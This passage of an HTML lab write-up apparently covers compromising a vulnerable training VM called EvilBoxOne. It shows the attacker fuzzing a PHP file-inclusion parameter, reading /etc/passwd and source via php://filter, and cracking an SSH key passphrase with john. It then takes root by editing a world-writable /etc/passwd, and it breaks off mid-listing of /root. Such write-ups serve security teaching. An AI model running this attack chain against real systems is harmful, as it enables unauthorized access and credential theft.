+</span></span></span><span class="line"><span class="cl"><span class="s1"> :: Threads          : 40
+</span></span></span><span class="line"><span class="cl"><span class="s1"> :: Matcher          : Regexp: root:x
+</span></span></span><span class="line"><span class="cl"><span class="s1">________________________________________________
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">command                 [Status: 200, Size: 1398, Words: 13, Lines: 27, Duration: 2ms]
+</span></span></span><span class="line"><span class="cl"><span class="s1">:: Progress: [20476/20476] :: Job [1/1] :: 5714 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
+</span></span></span><span class="line"><span class="cl"><span class="s1">┌──(v4ler1an㉿kali)-[~/Documents/tools/scan/wfuzz]
+</span></span></span><span class="line"><span class="cl"><span class="s1">└─$ ./wfuzz -c -u &#39;</span>http://172.16.86.147/secret/evil.php?FUZZ<span class="o">=</span>/etc/passwd<span class="err">&#39;</span> -w /usr/share/seclists/Discovery/Web-Content/big.txt --hh <span class="m">0</span>
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://172.16.86.147/secret/evil.php?FUZZ<span class="o">=</span>/etc/passwd
+</span></span><span class="line"><span class="cl">Total requests: <span class="nv">20476</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       <span class="nv">Payload</span>
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000004959:   <span class="m">200</span>        <span class="m">26</span> L     <span class="m">38</span> W       <span class="m">1398</span> Ch     <span class="s2">&#34;command&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Total time: 16.27521
+</span></span><span class="line"><span class="cl">Processed Requests: <span class="m">20476</span>
+</span></span><span class="line"><span class="cl">Filtered Requests: <span class="m">20475</span>
+</span></span><span class="line"><span class="cl">Requests/sec.: 1258.109
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The parameter is <code>command</code>, we can access the evil.php with it:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/scan<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ curl http://172.16.86.147/secret/evil.php?command<span class="o">=</span>/etc/passwd
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
+</span></span><span class="line"><span class="cl">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can get a user named <code>mowree</code> , but we still have no password.</p>
+<h3 id="1-vire-php-source">1. vire php source</h3>
+<p>We can get the php version info through the command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/scan<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ curl http://172.16.86.147/secret/evil.php?command<span class="o">=</span>php --version
+</span></span><span class="line"><span class="cl">curl 8.3.0 <span class="o">(</span>x86_64-pc-linux-gnu<span class="o">)</span> libcurl/8.3.0 OpenSSL/3.0.11 zlib/1.2.13 brotli/1.0.9 zstd/1.5.5 libidn2/2.3.4 libpsl/0.21.2 <span class="o">(</span>+libidn2/2.3.4<span class="o">)</span> libssh2/1.11.0 nghttp2/1.58.0 librtmp/2.3 OpenLDAP/2.5.13
+</span></span><span class="line"><span class="cl">Release-Date: 2023-09-13
+</span></span><span class="line"><span class="cl">Protocols: dict file ftp ftps gopher gophers http https imap imaps ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp
+</span></span><span class="line"><span class="cl">Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM NTLM_WB PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So, we can consider to view the php page source through the php filter:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/scan<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ curl http://172.16.86.147/secret/evil.php?command<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>evil.php
+</span></span><span class="line"><span class="cl">PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg<span class="o">==</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/scan<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ <span class="nb">echo</span> <span class="s2">&#34;PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg==&#34;</span><span class="p">|</span>base64 -d
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;command&#39;</span><span class="o">]</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    include<span class="o">(</span><span class="nv">$filename</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We get the source code of <code>evil.php</code>.</p>
+<p>(Things about php filter:https://mayi077.gitee.io/2020/08/09/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81/ )</p>
+<h3 id="2-local-file-include-vulnerability">2. Local File Include Vulnerability</h3>
+<p>As we can see in evil.php source code, the code is vulnerable to LFI, not RFI case it has not use &ldquo;allow_url_open&rdquo; or &ldquo;allow_url_include&rdquo; function. So, we just condier to use the LFI vulnerability to achive the shell.</p>
+<p>We can find a ssh private key in <code>/home/mowree/.ssh/authorized_keys</code>  and a <code>id_rsa</code>, so we can consider to login ssh with <code>id_rsa</code> file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/crack<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh mowree@172.16.86.147 -i <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;hash&#39;</span>:
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Well, the file has passphrase, so we need to get the passphrase.</p>
+<h3 id="3-hash-crack">3. hash crack</h3>
+<p>jphn has a script named <a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py" target="_blank" rel="noopener noreffer">ssh2john</a>, so we can brute force the passphase with john.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/crack<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ chmod <span class="m">600</span> <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/crack<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ python ssh2join.py hash<span class="p">|</span>tee hash1
+</span></span><span class="line"><span class="cl">hash:<span class="nv">$sshng$0$8$9</span>FB14B3F3D04E90E<span class="nv">$1192$bae426d821487bf7994f9a4dc90ebe2b551aa7f15859cb04925cce36dfb1e003ba1668c5991f11529c0c1eeae66d10ba86aca88aff2f8294204113d83332774204bd9140867600b9f9c5e5342493fc6290392e103103144da723659f04273a1ea3bfbbb4207c664fec5bb6fc7379b80b3d02984e66badf19cae4e70744809460107d98eab2576e8078d9d6dd7b9a575bfa0cd618152629338b3bf81cb80642f938fe0681a46f68277a2300f39a095facbf76aab822bd744289bed2d385b2ea2d6fb03d5d3b9b80496c954126f1f196eb8917df1dcbb5746ca11d769fe92b67a4fe20e4f34e13161314755b1a7851bfe41ed5d3cddbc34016e005fe21d3cab208ec4611a5591ca695ff29c69cebf4ce1959fb3d7add28e9a553cad3b1f86dd2e0f520b5a2662e9ef260ba7312d004c2f2e016ce8439233e646b487e34ea1f52b56d7c967f3a786d30a5be33de3c1209d8ce1ec57ead4a94c8d91f19c84b76dd725e0c155d05dc7a71fa20ee92fc9f79e58aba8794bafccd7d52953d92aac9a26ead1aa7c585bf7f37499bef1756231071c81001a67e65bdab556d20ca27ec1228314a175a4f93c674914a2952d2f9b0f5b47072e943a12829f71fc79db57c2f64dfbd3c3183cd4704a6bf716022e4987fa172bd3aca952d96ef54ade3cb87f5ecf782804cae23a0e216ecef069cf74a06223edc7934a9a90bd64c9841506d323293c8433cc9172cb0666bfcc7559d85a6543e6911d0326ca05f046ff156ed82477efc0512b3949922caa4635d02e814c543cf7237d11a636e97d842cd839b633b31bdbac0d416e1f7fba9edf42bf231ae6ecc7e424fcee7909528bde081d768fbe5e2fc82a0f2d6f3d273b0d0ecbc6f0f86b9164693c8c29cca76d30fc106e43eee3292a80a91861199595f5fca1e8acdc2d610a3aafa772ed87440323eed286b15be70d27d2a7c34f8a34dd4d4fba7da2a9d23833e8836541784b4043df103fce9f9df7c3671a546a32624af92b66a912089370d1464bccc710a6d768360e8b515204f6fa681a6779eae797aacd7461d14d4fe507e13be57c5b36d5ce13faf9132daa05b52f4880801e029d322e77a0e95d0b51f65ffff5a96b5dafb89d67035b61a82a3963c4e28d2bc8d7b39f129d2eb62ebbdc3595689198ea97c5e2ef12f45db124d20b6922d2ed5fbc401cb153559b78507e9cb0e730ab9bef2401a1ebd43f8a4cf95e6c90fb00f0404403ccd78e8fdcc1875fb5ceb766b749bb848e569c825a904336bea0aa96e379084b38bbca7589afa678bd095652e86df9d48318b74339bd485da989f41d78f554e065c684838151fdf86edb348842037feab1d82a70c6801ed6d3262279597d1dac2959487872017c7abf84f7f63c7bd4d1ca73ecccdf637eb1f6e7d9739307d890d3f172911002774b4a4ca653ff65c5e344b3a5112417794436caf6fad66fb3a61834423587d77d609da048855223d672e74da8bdf7ebd87707bcfbc9c9ab8fd65e190df954d85e77444f61f47c5353140a9b9361c6cbafbaa92ff843a0d55714c7769e038364119d14e3a7be1d435359ee3bae72f5bb0c1144f822bcd1d92bafdc85cb26d552a0701eb9a64151462e44b623ff243958c88c52a4190e2b35158a568a3f1da46823f7f61bab5b12239572550c4fc8aeb4083c4b854</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/crack<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ john hash1 --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>SSH, SSH private key <span class="o">[</span>RSA/DSA/EC/OPENSSH 32/64<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES<span class="o">])</span> is <span class="m">1</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Cost <span class="m">2</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">2</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">unicorn          <span class="o">(</span><span class="nb">hash</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE <span class="o">(</span>2023-11-12 22:59<span class="o">)</span> 100.0g/s 124200p/s 124200c/s 124200C/s unicorn
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, we can login ssh with id_rsa.</p>
+<h3 id="4-login-ssh">4. login ssh</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/crack<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh mowree@172.16.86.147 -i <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;hash&#39;</span>:
+</span></span><span class="line"><span class="cl">Linux EvilBoxOne 4.19.0-17-amd64 <span class="c1">#1 SMP Debian 4.19.194-3 (2021-07-18) x86_64</span>
+</span></span><span class="line"><span class="cl">mowree@EvilBoxOne:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>mowree<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>mowree<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>mowree<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="4-privilege-escalation">4. Privilege Escalation</h2>
+<p>Now we have normal username and can login ssh, we need to be root.</p>
+<p>Find some application with root privilege:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mowree@EvilBoxOne:~$ find / -perm -4000 -type f -exec ls -la <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">436552</span> Jan <span class="m">31</span>  <span class="m">2020</span> /usr/lib/openssh/ssh-keysign
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">10232</span> Mar <span class="m">28</span>  <span class="m">2017</span> /usr/lib/eject/dmcrypt-get-device
+</span></span><span class="line"><span class="cl">-rwsr-xr-- <span class="m">1</span> root messagebus <span class="m">51184</span> Jul  <span class="m">5</span>  <span class="m">2020</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">51280</span> Jan <span class="m">10</span>  <span class="m">2019</span> /usr/bin/mount
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">44440</span> Jul <span class="m">27</span>  <span class="m">2018</span> /usr/bin/newgrp
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">63736</span> Jul <span class="m">27</span>  <span class="m">2018</span> /usr/bin/passwd
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">34888</span> Jan <span class="m">10</span>  <span class="m">2019</span> /usr/bin/umount
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">54096</span> Jul <span class="m">27</span>  <span class="m">2018</span> /usr/bin/chfn
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">44528</span> Jul <span class="m">27</span>  <span class="m">2018</span> /usr/bin/chsh
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">84016</span> Jul <span class="m">27</span>  <span class="m">2018</span> /usr/bin/gpasswd
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">63568</span> Jan <span class="m">10</span>  <span class="m">2019</span> /usr/bin/su
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We has not found somenthing special. Return <code>/etc/passwd</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mowree@EvilBoxOne:~$ cat /etc/passwd
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
+</span></span><span class="line"><span class="cl">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mowree@EvilBoxOne:~$ ls -la /etc/passwd
+</span></span><span class="line"><span class="cl">-rw-rw-rw- <span class="m">1</span> root root <span class="m">1398</span> Aug <span class="m">16</span>  <span class="m">2021</span> /etc/passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Everyone can modify the <code>/etc/passwd</code>,</p>
+<p>So we can consider remove root&rsquo;s passwd, just remove <code>x</code> character. But it doesn&rsquo;t work.</p>
+<p>Ok, change the root&rsquo;s passwd. Because the root&rsquo;s passwd is stored in <code>/etc/shadow</code> file, so here is <code>x</code> . We can just change <code>x</code> to password&rsquo;s MD5 hash,and then can change root&rsquo;s password.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mowree@EvilBoxOne:~$ openssl passwd -1
+</span></span><span class="line"><span class="cl">Password:								--&gt; root<span class="err">&#39;</span>s passwd is root
+</span></span><span class="line"><span class="cl">Verifying - Password:		--&gt; root
+</span></span><span class="line"><span class="cl"><span class="nv">$1$BVZFyXa8$KD</span>/LR0zYZNZ1w5gurJUy4/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Change the root&rsquo;s passwd:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mowree@EvilBoxOne:~$ vi /etc/passwd
+</span></span><span class="line"><span class="cl">mowree@EvilBoxOne:~$ su
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">root@EvilBoxOne:/home/mowree# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@EvilBoxOne:/home/mowree# ls -la /root
+</span></span><span class="line"><span class="cl">total <span class="m">24</span>
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">3</span> root root <span class="m">4096</span> Aug <span class="m">16</span>  <span class="m">2021</span> .
